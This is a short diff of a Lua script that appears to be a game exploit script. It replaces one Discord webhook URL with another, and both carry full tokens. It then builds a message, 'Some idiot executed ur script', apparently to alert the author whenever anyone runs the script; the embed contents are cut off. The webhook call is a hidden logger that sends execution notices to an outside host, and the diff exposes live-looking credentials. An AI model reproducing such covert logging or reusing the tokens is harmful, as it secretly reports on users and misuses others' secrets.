@@ -7,7 +7,7 @@ local webhookcheck =
    "random exploit"
 
 local url =
-   "https://discord.com/api/webhooks/1073967393723908127/bntYL8z1AlKFe8ufIMSbd0TsklMHbagpDblhM2VzrEn7GkQWISLhFJd9KSL49VJt5n2W"
+   "https://discord.com/api/webhooks/1073991946269368441/95mZFuXU67hwfyf_pwyIB7Yazvlp9w_jbSCAxAPhdo5gW5DzEEIA1FWpQi5YraR4Ijpz"
 local data = {
    ["content"] = "Some idiot executed ur script",
    ["embeds"] = {
